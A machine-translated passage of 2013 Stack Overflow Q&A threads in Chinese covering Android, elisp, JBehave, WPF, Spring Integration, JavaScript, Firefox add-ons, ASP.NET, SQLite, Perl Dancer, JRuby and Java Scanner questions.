你还没有`onClickListener()`为你设置`Button`

```
private void setids() {
    // TODO Auto-generated method stub
    Descrip = (Button)findViewById(R.id.bCharDescrip);
    Descrip.setOnClickListener(this);   // add this line
} 
```

现在在`Buttons`此处添加您的另一个并以相同的方式使用`setOnClickListener()`for each。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-12T14:31:01.820

您应该在 Button 上设置 OnClickListener 。. .

```
private void setids() {
        // TODO Auto-generated method stub
        Descrip = (Button)findViewById(R.id.bCharDescrip);
        Descrip.setOnClickListener(this);
    } 
```

# emacs - 为什么这个从缓冲区中获取文本的 elisp 函数不起作用

> ID：15973900
> 
> 赞同：1
> 
> 时间：2013-04-12T14:24:45.203
> 
> 标签：emacs, elisp

我有一些这样的文字：

```
qwerty\tberty 
merty\tserty 
```

我想抓住制表符和行尾之间的文本berty。然后显示它工作到缓冲区的末尾并在那里插入文本。

但是这段代码不起作用。有什么想法为什么不呢？

```
(defun do-test ()
  "tester"
  (interactive)
  (goto-char (point-min))
  (if (search-forward "qwerty" nil t)
     (delete-char 1) ;;delete tab
     (setq myStr (buffer-substring point end-of-line)) ;add text to variable
     ;goto end of buffer and insert text as demonstration it works
     (goto-char (point-max))
     (insert(myStr))
  )
) 
```

编辑：

抱歉剪切和粘贴错误。本来应该：

（如果（向前搜索“qwerty”nil t）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-12T14:43:53.433

您的代码中存在许多问题：

1.  `if`接受第一个参数，如果测试是肯定的，则执行该参数；所有剩余的参数都以其他方式执行（就像`else`大多数命令式语言中的和子句一样）。您可以将所有表达式分组到一个`progn`表单中，也可以使用该`when`表单，它采用任意数量的表达式来评估条件是否为真，并且没有`else`子句。

2.  `point`和`line-end-position`是函数，这意味着您必须调用它们才能获取值：例如`(point)`.

3.  另一方面，`myStr`是一个变量，这意味着你可以直接插入它的值（你不能像函数一样调用它）

4.  如果要保持原始缓冲区不变，则应将点向前移动 1 个字符，而不是删除 TAB。这可以使用`forward-char`命令来完成。

考虑到所有这些，这是您的函数的修改版本。另外，我将“选项名称”更改为“qwerty”以匹配您的示例。

```
(defun do-test ()
  "tester"
  (interactive)
  (goto-char (point-min))
  (when (search-forward "qwerty" nil t)
      (forward-char 1) ;;skip tab
      ;store text in variable `myStr'
      (setq myStr (buffer-substring (point) (line-end-position)))
      ;goto end of buffer and insert text as demonstration it works
      (goto-char (point-max))
      (insert myStr))) 
```

* * *

请注意，使用正则表达式可能是实现目标的更好方法：

```
(defun do-test ()
  (interactive)
  (goto-char (point-min))
  (when (re-search-forward "qwerty\t\\(.*\\)")
    (goto-char (point-max))
    (insert (match-string 1)))) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-12T15:22:23.903

除了@Francesco 的回答，我认为逻辑非常脆弱，它会影响编辑器的全局状态。您可能会考虑将解析提取到纯函数中，如下所示：

```
(defun extract-matches (str)
  "Extract the last tab-separated value of each line in STR."
  (mapcar (lambda (s) (car (last (split-string s "\t"))))
          (remove-if-not (lambda (s) (string-match-p "\t" s))
                         (split-string str "\n"))))

(defun extract-eol-tsv ()
  "For each line in the buffer, extract the last tab-delimited
phrase and insert it at the end of the buffer."
  (interactive)
  (save-excursion
    (goto-char (point-max))
    (dolist (m (extract-matches (buffer-string))) 
      (insert (format "%s\n" m))) 
```

使用纯函数有助于保持有趣的逻辑可测试 - 现在，您可以验证 finnicky 解析内容是否有效，而无需修改缓冲区。

# jbehave - 如何使用 jBehave 同时执行多个测试？

> ID：15973904
> 
> 赞同：7
> 
> 时间：2013-04-12T14:24:56.027
> 
> 标签：jbehave

我有一些使用 jBehave 和 WebDriver 创建的测试。

当我通过 Maven 执行它们时，执行是安全的：

测试 1

*   打开导航器
*   执行第一个故事的所有步骤
*   关闭导航器

测试 2

*   打开导航器
*   执行第二个故事的所有步骤
*   关闭导航器

...

我有兴趣同时执行测试。根据文档，这是可能的。

[http://jbehave.org/reference/stable/multi-threading.html](http://jbehave.org/reference/stable/multi-threading.html)

我已经尝试将符号添加到“Stories”类，并且还使用threads = 5执行了mvn命令，但不起作用。

```
 @UsingEmbedder(threads=5)
    public class EtsyDotComStories extends JUnitStories {

    ...
    @Override
    protected List<String> storyPaths() {
    return new StoryFinder().findPaths(codeLocationFromClass(this.getClass()).getFile(), asList("**/*.story"), null);

    }

        }

 mvn clean install -s settings.xml -Pjava-spring,codehaus,threads=5 
```

是否可以同时执行多个测试？

编辑：

添加了maven执行部分：

```
<plugins>
      <plugin>
        <groupId>org.jbehave</groupId>
        <artifactId>jbehave-maven-plugin</artifactId>
        <version>${jbehave.core.version}</version>
        <executions>
          <execution>
            <id>embeddable-stories</id>
            <phase>integration-test</phase>
            <configuration>
              <includes>
                <include>**/*Stories.java</include>
              </includes>
              <ignoreFailureInStories>true</ignoreFailureInStories>
              <ignoreFailureInView>false</ignoreFailureInView>
              <threads>5</threads>
              <executorsClass>org.jbehave.core.embedder.executors.SameThreadExecutors</executorsClass>
            </configuration>
            <goals>
              <goal>run-stories-as-embeddables</goal>
            </goals>
          </execution>
        </executions>
        <dependencies>
          <dependency>
            <groupId>com.google.guava</groupId>
            <artifactId>guava</artifactId>
            <version>11.0.1</version>
          </dependency>
        </dependencies>
      </plugin>
    </plugins> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-16T09:27:26.467

您的问题可能包含更多细节，但我假设您正在使用 run-stories-as-embeddables 目标。你基本上有两个选择：

1.  当使用 run-stories-as-embeddables 目标时，将属性“threads”设置为目标。扩展[Maven Gauls 文档](http://jbehave.org/reference/stable/maven-goals.html)中的示例：

    ```
    <plugin>
        <groupId>org.jbehave</groupId>
        <artifactId>jbehave-maven-plugin</artifactId>
        <version>[version]</version>
        <executions>
            <execution>
                <id>run-stories-as-embeddables</id>
                <phase>integration-test</phase>
                <configuration>
                    <includes>
                        <include>**/*Stories.java</include>
                    </includes>
                    <ignoreFailureInStories>true</ignoreFailureInStories>
                    <ignoreFailureInView>false</ignoreFailureInView>
                    <treads>5</threads>
                </configuration>
                <goals>
                    <goal>run-stories-as-embeddables</goal>
                </goals>
            </execution>
        </executions>
    </plugin> 
    ```

2.  使用 run-stories-with-annotated-embedder maven 目标，它应该尊重注释

此外，您上面描述的两个场景必须在**两个单独**的故事中。多线程只发生在故事级别。同一个故事中的场景不是多线程执行的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-06-06T10:00:46.693

使用 Spring JUnit 测试运行器`.useThreads(20)`

```
@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration(locations = {
    ...
})
public class Stories extends JUnitStories {

    @Before
    public void setUp() throws Exception {
        configuredEmbedder()
                .embedderControls()
                ...
                .useThreads(20)
                .useStoryTimeouts(Integer.toString(maxIfDebugOr(1800)));
    }
... 
```

# android - Activity 的带有 overridePendingTransition 的幻灯片动画效果很奇怪

> ID：15973905
> 
> 赞同：13
> 
> 时间：2013-04-12T14:24:56.860
> 
> 标签：android, android-intent, android-activity, android-animation

我正在创建一个动画，以便在用户进行特定活动时显示。基本上，此活动向上滑动以显示，向下滑动以关闭。我正在使用 overridePendingTransition 来制作这个动画。

但是幻灯片有一个丑陋的效果。可以在屏幕截图中看到： ![截屏](https://i.stack.imgur.com/Ejgix.png)

查看正在关闭的活动上显示的灰色矩形。为什么会显示？

我以为会是Android的android.R.id.content视图，所以我尝试改变它的背景，但是没有成功。

我正在使用 ActionBarSherlock，代码如下所示：

slide_in_from_bottom.xml

```
<translate xmlns:android="http://schemas.android.com/apk/res/android"
           android:fromYDelta="100%p"
           android:toYDelta="0%p"
           android:duration="@android:integer/config_mediumAnimTime"/> 
```

slide_out_to_bottom.xml

```
<translate xmlns:android="http://schemas.android.com/apk/res/android"
           android:fromYDelta="0%p"
           android:toYDelta="100%p"
           android:duration="@android:integer/config_mediumAnimTime"/> 
```

什么都没有.xml

```
<alpha xmlns:android="http://schemas.android.com/apk/res/android"
    android:duration="0" android:fromAlpha="1" android:toAlpha="1"/> 
```

开始活动：

```
Intent intent = new Intent();
intent.setClass(getActivity(), PlayerActivity.class);
startActivity(intent);

getActivity().overridePendingTransition(R.anim.slide_in_from_bottom, R.anim.nothing); 
```

结束活动：

```
@Override
public void onBackPressed() {
    finish();
    overridePendingTransition(R.anim.nothing, R.anim.slide_out_to_bottom);
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-15T13:51:51.950

我在这里找到了我的问题的答案：

[https://stackoverflow.com/a/6396465/1140713](https://stackoverflow.com/a/6396465/1140713)

我刚刚创建了一个 BaseActivity，我的所有活动都是子类，并在 onCreate 中添加了以下代码：

```
ColorDrawable colorDrawable = new ColorDrawable( Color.TRANSPARENT );
getWindow().setBackgroundDrawable( colorDrawable ); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-12T14:27:52.890

这可能是因为您的通知栏。你的下一个活动也有通知栏，它带有它的空间。不确定，如果有任何解决方法...您可以尝试设置 FullScreen 但当然这不是您想要的。

# c# - 如何从网格中获取和删除某个位置的控件

> ID：15973907
> 
> 赞同：0
> 
> 时间：2013-04-12T14:24:59.173
> 
> 标签：c#, .net, wpf, grid, runtime

我正在`Grid`使用以下代码在运行时添加一个控件：

```
void AddControl(UserControl oControl)
{
    grid.Children.Add(oControl);
    oControl.SetValue(Grid.RowProperty, 1);
    oControl.SetValue(Grid.ColumnProperty, 0);
} 
```

我想删除同一位置的控件（行 = 1，列 = 0）。我没有保留对之前添加的控件的引用。如何从`Grid`?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-12T15:45:28.307

> 我有两个用户控件，其中有一些功能。在主窗口中，我有两个按钮。单击第一个时，我将 UserControl1 设置在第二行，单击第二个时，我将 UserControl2 设置在同一位置

为了实现这一目标，您需要的是`TabControl`：

```
 <TabControl>
        <TabItem Header="Tab 1">
            <Grid Background="Gray">
                <TextBlock Text="Here goes UserControl 1"
                           VerticalAlignment="Center" HorizontalAlignment="Center"/>
            </Grid>
        </TabItem>

        <TabItem Header="Tab 2">
            <Grid Background="Gray">
                <TextBlock Text="Here goes UserControl 2"
                           VerticalAlignment="Center" HorizontalAlignment="Center"/>
            </Grid>
        </TabItem>
    </TabControl> 
```

结果：

![在此处输入图像描述](https://i.stack.imgur.com/3gip3.png)

> 为什么在代码后面添加控件不好？

因为它造成了可维护性混乱。UI 元素必须在 XAML 中定义。这就是 XAML 的用途。在后面的代码中创建 UI 元素不仅需要更多代码，而且容易出错，并且完全破坏了 XAML 支持的 UI 和代码分离。

> 如果我需要**动态**创建 UI 怎么办？

然后你必须使用`DataTemplates`XAML 中定义的。可选地`DataTriggers`用于根据 Model / ViewModel 中的某些属性修改 UI 元素的状态

WPF 的“动态”思想确实与传统的 UI 框架不同。

# web-services - 使用 Spring 集成聚合器进行 Web 服务

> ID：15973908
> 
> 赞同：0
> 
> 时间：2013-04-12T14:24:59.967
> 
> 标签：web-services, spring, spring-integration

我有一些服务，其中一些是从 JMS 消息启动的，另一些是从 WS 调用启动的。对于所有这些，我已经使用 spring 集成实现了日志记录、验证、适应（XSD 到域）和持久性解决方案。它一直工作到现在。一段时间后，新的请求类型被添加到需求中。这些请求有子项，它们将被并行处理。这些子项将被组合起来，然后形成一个单一的响应。我试过聚合器，它适用于 JMS。我收集每个子项目的响应，并在需要时创建主要响应。

问题在于 WS 调用它不起作用。我正在使用soapUI 进行测试，我已经发送了请求、日志记录、适应、聚合等工作，但我没有看到响应。

总结：在ws调用中使用聚合器是否会导致web服务调用线程退出，破坏请求-响应匹配机制？

编辑：正如 Gary Russell 所建议的，我正在为问题添加细节：

```
<int-ws:inbound-gateway id="ws-inbound-gateway"
                        request-channel="requestMessagesChannelForWS"
                        reply-channel="ws-response-channel"
                        error-channel="ws-error-channel"
                        header-mapper="xmlMessageExtractorSoapHeaderMapper"/>

<int:header-enricher input-channel="requestMessagesChannelForWS" output-channel="headerEnricherChannel">
    <int:header name="from" ref="headersMapManagerService" method="getFromWSValue"/>
</int:header-enricher>

<int:header-enricher input-channel="headerEnricherChannel" output-channel="requestMessagesRoutingChannel">
    <int:header name="messageHeader" expression="payload.getMessageHeader()"/>
</int:header-enricher>

<int:recipient-list-router id="xmlMessageRouter"
                           input-channel="requestMessagesRoutingChannel">
    <int:recipient channel="messageToLogAdapterChannel"/>
    <int:recipient channel="requestMessageValidatorChannel"/>
</int:recipient-list-router> 
```

我省略了 messageToLogAdapterChannel 和 requestMessageValidatorChannel 步骤。验证后，流程在此处继续：

```
<int:chain input-channel="serviceAvailabilityCheckMessageChannelForAdaption">
    <int:transformer expression="@serviceAvailabilityCheckMessageAdapterService.adaptMessage(headers, payload)"/>
    <int:service-activator
            expression="@serviceAvailabilityCheckHandler.handleServiceAvailabilityCheckRequest(payload)"/>
</int:chain> 
```

如您所见，链上没有定义输出通道。我手动完成。serviceAvailabilityCheckHandler.handleServiceAvailabilityCheckRequest 方法在 BPMN 引擎（Activiti）上创建流程实例。我等待来自该引擎的有关流程完成的信号并创建一个新对象（不是消息）并将其发送到通道。

```
public void processEnded(OrderData orderData) {
    sendMessageToChannel(orderData, processResultChannel);
}

<int:router input-channel="processResultChannel" expression="payload.orderClass.name">
    <int:mapping value="domain.ServiceAvailabilityOrderRequestItem"
                 channel="serviceAvailabilityCheckCompletionChannel"/>
</int:router>

<int:service-activator input-channel="serviceAvailabilityCheckCompletionChannel"
                       output-channel="serviceAvailabilityCheckResponseItemAggregationChannel"
                       ref="serviceAvailabilityCheckHandler"
                       method="onItemComplete"/>

<int:aggregator input-channel="serviceAvailabilityCheckResponseItemAggregationChannel"
                output-channel="ws-response-channel"
                method="combineResponseItems"
                ref="serviceAvailabilityCheckHandler"
                correlation-strategy="serviceAvailabilityCheckHandler"
                correlation-strategy-method="correlateResponseItems"
                release-strategy-method="isResponseComplete"
                release-strategy="serviceAvailabilityCheckHandler"/> 
```

使用此配置，我的聚合器工作，项目到达聚合器，然后我的自定义实现（combineResponseItems、correlateResponseItems 和 isResponseComplete）组合响应项并将其发送到 ws-response-channel。

我得到了这个例外：

> org.springframework.integration.support.channel.ChannelResolutionException：没有可用的输出通道或replyChannel标头

恕我直言，这里的问题是：我在*handleServiceAvailabilityCheckRequest*处收到请求并启动一个进程，完成后我创建一个对象作为响应，但 spring 集成无法将该对象与请求相关联。我的响应对象中没有任何标题或与请求相关的内容。我无法将请求相关的东西传递给流程，我需要在集成层处理它。这是我卡得很厉害的地方。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T15:34:45.783

如果您的流程很复杂，您可能需要增加`reply-timeout`入站网关的时间（默认为 1 秒）。

编辑：

" `org.springframework.integration.support.channel.ChannelResolutionException: no output-channel or replyChannel header available`"

这意味着某些组件正在删除 replyChannel 标头。

同样，您需要显示整个配置。您不能随意创建新消息并期望框架知道如何处理它。

如果没有全貌（配置、代码和调试日志），很难推测发生了什么。我建议您打开调试日志记录并通过您的流程跟踪消息。如果您想不通，我们可以提供帮助，但我们可能应该切换到聊天 - Stack Overflow 网站不允许冗长的讨论。

编辑：

正如聊天中所讨论的，您正在任意创建新消息；框架无法知道这些消息与输入相关。

# javascript - 将混合字符串传递给 Javascript 函数

> ID：15973909
> 
> 赞同：1
> 
> 时间：2013-04-12T14:25:00.323
> 
> 标签：javascript, string

我创建了一个动态库存表，它加载一个包含产品列表的表，其中一个字段是一个 html 复选框，我已将该复选框链接到一个 javascript 函数以使用 onclick 事件并在函数中传递产品 ID（ ）。

当产品 ID 只是一个数字（例如 12345）时，Javascript 可以正常工作，但是当 ID 是混合字符串（例如 12345-HIGH）时，Javascript 会失败。我需要保持 ID 完整，因为它稍后会使用，所以我无法更改或转换它？

我似乎无法找到将混合字符串传递给 javascript 函数的方法。我不确定这是否有帮助，但 ID 通常会有一个“-”，并且文本（如果有的话）总是不同的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T14:43:11.500

如果您知道您的字符串将始终以您要提取的数字部分开头，您可以使用`parseInt()`并利用 Javascript 解析的特性来仅提取数字部分：

```
parseInt("12345-HELLO") 
```

将返回 12345 作为整数。但

```
parseInt("HELLO-12345-HELLO") 
```

将返回`NaN`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-12T14:56:07.367

如果不知道每个可能的字符串是由什么组成的，就很难知道正确的答案，但听起来它会

1.  总是以数字开头
2.  有时有一个`-`后跟一个字符串

如果这些是真的，你可以这样做：

```
var productId = "12345-HIGH";
var num = productId.split('-')[0]; 
```

此时它仍然是一个字符串，但您可以使用 将其转换为整数`parseInt(num)`，如 jxpx777 发布的那样。

# firefox - 如何在 gBrowser.addTab() 创建的选项卡中附加脚本？

> ID：15973917
> 
> 赞同：1
> 
> 时间：2013-04-12T14:25:15.110
> 
> 标签：firefox, firefox-addon, firefox-addon-sdk

我正在尝试创建空选项卡并将脚本文件注入其中。

```
var wm = Cc["@mozilla.org/appshell/window-mediator;1"].getService(Ci.nsIWindowMediator);
var browserEnumerator = wm.getEnumerator("navigator:browser");
var tabbrowser = browserEnumerator.getNext().gBrowser;
var newTab = tabbrowser.addTab(""); 
```

使用 pageMod 我可以附加文件

```
contentScriptFile: [data.url("jquery-1.9.1.min.js")], 
```

如何为 gBrowser 创建的选项卡附加脚本？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-13T20:00:47.663

除了现有的选项卡之外，我需要做一些类似的事情——这意味着你可能需要稍微调整一下并监听添加的选项卡的`"load"`事件`contentWindow`：

设置 attachWorker 功能：

```
let contentWorker=require("sdk/content/worker");

function attachWorker(contentWindow,options){    
    options.window = contentWindow;
    let worker = contentWorker.Worker(options);
    worker.once("detach", function detach() {
        worker.destroy();
    });
    return worker;
} 
```

当有一个选项卡时：

```
var browser=gBrowser.getBrowserForTab(tab);
var contentWindow=browser.contentWindow; 
```

何时`contentWindow`加载——监听`contentWindow` `'load'`（如果适用？）：

```
var options={contentScriptFile:...};
attachWorker(contentWindow, options); 
```

内容工作者的文档：
[https ://addons.mozilla.org/en-US/developers/docs/sdk/latest/modules/sdk/content/worker.html](https://addons.mozilla.org/en-US/developers/docs/sdk/latest/modules/sdk/content/worker.html)

来自 sdk 的代码`attachWorker()`稍作改动版本`Worker()`（可从您的 jetpack 插件包或[mozilla addon-sdk 存储库中获得](https://github.com/mozilla/addon-sdk/tree/master/lib/sdk)）：
[https ://github.com/mozilla/addon-sdk/blob/master/lib/sdk/标签/worker.js](https://github.com/mozilla/addon-sdk/blob/master/lib/sdk/tabs/worker.js)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T18:38:50.247

如果您已经在使用附加 SDK，则可以使用 tabs 模块：

```
var tabs = require("sdk/tabs");

tabs.on('ready', function(tab) {
  tab.attach({
      contentScript:
        'document.body.style.border = "5px solid red";'
  });
}); 
```

[https://addons.mozilla.org/en-US/developers/docs/sdk/latest/modules/sdk/tabs.html#attach%28options%29](https://addons.mozilla.org/en-US/developers/docs/sdk/latest/modules/sdk/tabs.html#attach%28options%29)

# javascript - Ajax 调用总是返回错误 500 客户端

> ID：15973919
> 
> 赞同：2
> 
> 时间：2013-04-12T14:25:20.700
> 
> 标签：javascript, jquery, asp.net, ajax

我试图将数据发布回位于 Default.aspx 中的 webmethod

jQuery代码：

```
data = "{'saveData':'testtestest'}"

    $.ajax({
        type: "POST",
        contentType: "application/json; charset=utf-8",
        url: "/Default.aspx/SavePins",
        data: data,
        dataType: "json",
        success: function (response) {
            if (response.d) {
                //    var obj = JSON.parse(response.d);
            }
        },
        error: function (xhr, ajaxOptions, thrownError) {
            $('#modalContentBox').html('Whoops! There was an error saving!').removeAttr('class').attr('class', 'alert alert-error');
            $('#myModal').modal();
        }
    }); 
```

网络方法：

```
[WebMethod]
public bool SavePins(string saveData)
{
    try
    {
        File.WriteAllText(string.Format("{0}{1}.shane", file_location, "pinsData"), saveData);
        return true;
    }
    catch (Exception)
    {
        return false;
    }
} 
```

问题是 Ajax 调用总是返回错误 500 客户端。它实际上并没有发布到服务器。页面中有一个`<form>`元素`runat="server"`。我已经添加`<asp:ScriptManager EnablePageMethods="True" runat="server"/>`

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-12T14:29:34.110

您需要 ScriptMethod 到您的 Web 方法，因为您需要将响应作为 json 发送。

```
[WebMethod]
[ScriptMethod(ResponseFormat = ResponseFormat.Json)]      
public bool SavePins(string saveData)
{
     try
      {
           File.WriteAllText(string.Format("{0}{1}.shane", file_location, "pinsData"),     saveData);
           return true;
      }
     catch (Exception)
     {
        return false;
      }
 } 
```

# java - 在表条件子句中转义特殊字符#

> ID：15973924
> 
> 赞同：0
> 
> 时间：2013-04-12T14:25:40.123
> 
> 标签：java, android, escaping, special-characters, android-sqlite

在 SQLite 中使用包含特殊字符的列名创建表`#`。

不知道如何逃避这个以便 SQLite 识别它。

我发现转义码`#`是`%23`. 所以我试着这样做：

```
condition = condition.replace("usernum#", "usernum%23"); 
```

其中 condition 是字符串类型的 SQLite 条件，例如，`select * from users where id = '2' ORDER BY usernum#`

但是上面的方法是给 SQLite 异常。

**日志：**

```
04-12 20:00:44.395: E/AndroidRuntime(8054): android.database.sqlite.SQLiteException: no such column: usernum (code 1): , while compiling: select * from Users WHERE id !=1 order by Type DESC, usernum%23 ASC 
```

**错误在这一行：**

```
Cursor curr = db.rawQuery("select " + fields + " from " + table + " "+ condition, null); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T14:37:42.667

> 04-12 20:00:44.395: E/AndroidRuntime(8054): android.database.sqlite.SQLiteException: no such column: usernum (code 1): , while compile: select * from Users WHERE id !=1 order by Type DESC，用户编号%23 ASC

由于列包含特殊字符，解决方案是将其包装到双引号（整列）并且它将起作用

```
select * from test order by "username#" desc; 
```

在你的情况下：

```
String query = "Select * from users where id = ? ORDER BY \"usernum#\"";
Cursor c = db.rawQuery(query, new String[] {String.valueOf(id)}); 
```

使用 query() 方法的解决方案：

```
String[] columns = {...};
String selection = idColumn + " = ?";
String[] args = {String.valueOf(id)};
String orderBy = "\"" + orderByColumn + "\"";
Cursor c = db.query(table, columns, selection, args, null, null, orderBy); 
```

# c# - 为什么我们要将 DataSet 代码与 DataAccess 代码分开？

> ID：15973925
> 
> 赞同：1
> 
> 时间：2013-04-12T14:25:42.253
> 
> 标签：c#, wcf, n-tier-architecture, dataset-designer

在这篇文章之后，我一直在使用分层方法转换我的 WinForm 应用程序：http: [//msdn.microsoft.com/en-us/library/vstudio/bb384570.aspx](http://msdn.microsoft.com/en-us/library/vstudio/bb384570.aspx)

在文章中，它建议创建两个单独的类库，一个用于类型化 DataSet 类，一个用于 DataAccess。我认为这两个实体在逻辑上是相当耦合的，那么为什么要划分它们呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T14:27:41.963

您希望能够在不引用任何较低级别的数据访问 API 的情况下引用您的强类型数据模型。您的消费代码不应该知道您的数据模型的来源。您可能希望在 UI 层中使用数据模型。您的 UI 层只需要了解模型，而不是模型如何填充数据。

# perl - perl dancer - 如何将附加参数传递给方法处理程序子例程？

> ID：15973928
> 
> 赞同：5
> 
> 时间：2013-04-12T14:25:49.800
> 
> 标签：perl, dancer

有没有办法将附加变量传递给方法处理程序子例程？我通常不喜欢在子例程范围之外使用全局变量。我有诸如数据库连接和类实例之类的东西，我希望处理程序可以访问它们，而无需使用全局变量。使用调试到控制台，看起来 @_ 对于每个处理程序调用都是空的。

```
#!/usr/bin/perl

use strict;

use Dancer;
use Data::Dumper;

set('logger' => 'console');

my $somevar = SomeClass->new();

get('/' => sub{
  debug(Dumper(@_));
  debug($somevar);
  return('hello world');
}); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-12T15:11:50.817

一种方法是使用`vars`Dancer 提供的散列。这里我使用了一个 before 钩子来设置一个数据库句柄：

```
use strict;
use warnings;
use Dancer;
use DBI;

hook 'before' => sub {
    var dbh => DBI->connect_cached(...);
};

get '/' => sub { 
    my $qry = vars->{dbh}->prepare("SQL");
    ...
    return "Something, something, query results";
}; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-03T16:45:37.083

有类似的东西

```
sub get_dbh {
    if (! vars('dbh')) {
        my $dbh = DBI->connect_cached(...);
        session(dbh => $dbh);
    }
    return vars('dbh');
} 
```

您可以从任何地方访问数据库句柄而不是全局的，数据库连接在您需要它之前不会建立，如果您稍后在程序中再次需要它，它仍然在 vars 集合中并且不需要再次创建.

# ruby-on-rails - JRuby 上 Rails 的 ActiveRecord 数据库 gem 是什么

> ID：15973929
> 
> 赞同：0
> 
> 时间：2013-04-12T14:25:50.863
> 
> 标签：ruby-on-rails, activerecord, jdbc, jruby

在[JRUBY](http://jruby.org/)上运行 rails 时，数据库适配器有两个不同的 gem。

1.  **Sql Server**： `sqlserver`宝石与`activerecord-sqlserver-adapter`宝石
2.  **Mysql**：`jdbcmysql`宝石与 `activerecord-jdbcmysql-adapter`宝石
3.  **Sqlite3**：`jdbcsqlite3`宝石与`activerecord-jdbcsqlite3-adapter`宝石
4.  **Postgresql**：`jdbcpostgresql`宝石与`activerecord-jdbcpostgresql-adapter`宝石
5.  **jdbc**：`jdbc`宝石与`activerecord-jdbc-adapter`宝石

`jdbcpostgresql`所以问题是，它的长形`activerecord-jdbcpostgresql-adapter`宝石有什么区别？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T19:06:25.547

*jdbcpostgresql* = postgresql 数据库的 Java 数据库连接

*activerecord-jdbcpostgresql-adapter* = Rails ActiveRecord 的 postgresql 数据库适配器，允许它与 JRuby 一起使用。

JDBC（Java 数据库连接）

> ActiveRecord-JDBC-Adapter (AR-JDBC) 是 Rails 的 ActiveRecord 组件的数据库适配器，可与 JRuby 一起使用。它允许在您的 JRuby on Rails 应用程序中使用几乎任何符合 JDBC 的数据库。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-04-12T16:27:28.600

我不知道有什么区别，但我在带有 jruby 和 postgres 的 Rails 3+ 应用程序中使用以下 Gemfile

```
gem 'activerecord-jdbcpostgresql-adapter'
gem 'jruby-openssl' 
```

另请参阅自述文件 - [https://github.com/jruby/activerecord-jdbc-adapter](https://github.com/jruby/activerecord-jdbc-adapter)

# javascript - 用没有 jQuery 的元素包装创建的文本节点

> ID：15973934
> 
> 赞同：0
> 
> 时间：2013-04-12T14:25:59.457
> 
> 标签：javascript

我正在编辑一个脚本，该脚本在某一时刻执行以下操作：

`err_node = document.createTextNode(err_decoded_str);`

但是我需要将结果文本节点包裹在`<label class="error">generated error node in here</label>`

不使用 jQuery 如何做到这一点？如果需要，我可以更改`createTextNode()`为不同的功能来实现这一点。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T14:28:09.053

因此，将其更改为使用[createElement](https://developer.mozilla.org/en-US/docs/DOM/document.createElement)

```
err_node = document.createTextNode(err_decoded_str); 
```

至

```
err_node = document.createElement("label");
err_node.className = "error";
err_node.innerHTML = err_decoded_str; 
```

如果需要，您可以创建一个文本节点并将其附加到 err_node。

```
err_node = document.createElement("label");
err_node.className = "error";
var err_textnode = document.createTextNode(err_decoded_str);
err_node.appendChild(err_textnode); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T14:28:08.883

当您将文本包装在 a 中`<label>`时，它将成为元素而不是文本节点。`document.createElement`在此处查看[MDN 文档。](https://developer.mozilla.org/en-US/docs/DOM/document.createElement)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-12T14:28:20.923

```
label = document.createElement('label');
label.className = 'error';
label.appendChild(document.createTextNode(err_decoded_str));
// attach the label to where ever its supposed to go 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-12T14:30:55.603

```
err_node = document.createTextNode(err_decoded_str);
var label = document.createElement("label"); // create label element
label.classList.add("error"); // add error class to label
label.appendChild(err_node); // append err_node to label
console.log(label); 
```

# java - 循环不执行多次

> ID：15973942
> 
> 赞同：1
> 
> 时间：2013-04-12T14:26:27.677
> 
> 标签：java, loops, while-loop, iteration, java.util.scanner

我应该制作一个程序来持续接受办公桌订单数据并显示超过 36 英寸长且至少有一个抽屉的橡木办公桌的所有相关信息。

```
import java.util.*;

public class MangMaxB 
{
    public static void main(String[] args)
    {
        Scanner input = new Scanner(System.in);
        char ans;
        int orderNum=0, length=0, width=0, numDrawer=0, price=1000;
        String name;

        System.out.print("Do you wish to enter Oak " +
                        "desk order data? (y/n)");
        ans = input.nextLine().charAt(0);

        while (ans != 'n')
        {  
            System.out.print("Enter customer name: ");
            name=input.nextLine();

            System.out.print("Enter order number: ");
            orderNum=input.nextInt();    

            System.out.print("Enter length and width of Oak desk" +
                        " separated by a space: ");
            length = input.nextInt();
            width = input.nextInt();

            System.out.print("Enter number of drawer/s: ");
            numDrawer=input.nextInt();

            if ((length>36)&&(numDrawer>=1))
            {
                if ((length*width)>750)
                {
                    price+= 250;
                }

                price+= (numDrawer*100);
                price+= 300;

                System.out.println("\nOak desk order information:\n" 
                        + "Order number: " + orderNum + "\n"
                        + "Customer name: " + name + "\n"
                        + "Length: " + length + ", width: "
                        + width + ", surface: " + (length*width)
                        + "\n" + "Number of drawer/s: " + numDrawer
                        + "\nPrice of the desk is P " + price);
            }

            else
            {
                System.out.println("\nOak desk order isn't over 36 " +
                        "inches long and doesn't have a drawer");
            }

            System.out.print("Any more items? (y/n) ");
            ans = input.nextLine().charAt(0);
        }
    }
} 
```

我能够输入数据并显示它，但在第二次尝试时，因为它是一个循环，它不起作用。

它说“线程“主”java.lang.StringIndexOutOfBoundsException 中的异常：字符串索引超出范围：controlStruc.MangMaxB.main 的 java.lang.String.charAt(Unknown Source) 处为 0”

我该如何解决？

* * *

## 回答 #1

